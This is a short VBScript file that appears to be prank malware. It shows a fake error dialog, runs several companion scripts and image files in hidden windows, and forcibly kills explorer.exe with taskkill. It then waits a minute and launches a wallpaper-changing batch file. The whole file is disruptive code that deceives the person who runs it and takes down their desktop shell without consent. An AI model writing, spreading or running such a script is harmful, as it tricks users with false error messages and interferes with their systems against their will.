Set Shell = WScript.CreateObject ("WScript.Shell")
MsgBox "Error. Sorry!",0,"Error has been occured!"
Shell.Run "dialog.vbs"

Shell.Run "cmd.exe /C cd Selfishes && ImSelfish.jpg",0
Shell.Run "cmd.exe /C cd Selfishes && Little_Selfish.jpg",0
Shell.Run "cmd.exe /C cd Selfishes && SelfishToo.png",0
Shell.Run "cmd.exe /C cd Selfishes && ImSelfish.jpg",0
Shell.Run "cmd.exe /C taskkill /im explorer.exe /f",0

Shell.Run "scr.vbs"
Shell.Run "images.vbs"
WScript.Sleep 60000
Shell.Run "ChaneWallpapers.bat"
